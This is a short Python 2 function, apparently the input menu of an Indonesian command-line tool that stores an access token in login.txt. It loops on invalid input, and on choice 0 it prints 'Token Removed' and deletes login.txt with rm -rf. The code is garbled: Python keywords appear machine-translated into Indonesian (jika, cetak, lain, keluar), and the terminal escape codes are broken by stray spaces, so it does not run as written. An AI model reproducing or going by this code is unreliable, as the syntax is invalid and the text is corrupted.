def pilih ():
	unikers = raw_input ("\ n \ 033 [1; 97m >>> \ 033 [1; 97m")
	jika unikers == "":
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
		pilih ()
	elif unikers == "1":
		super()
	elif unikers == "0":
		jalan ('Token Removed')
		os.system ('rm -rf login.txt')
		keluar ()
	lain:
		cetak "\ 033 [1; 96m [!] \ x1b [1; 91m Isi dengan benar"
		pilih ()


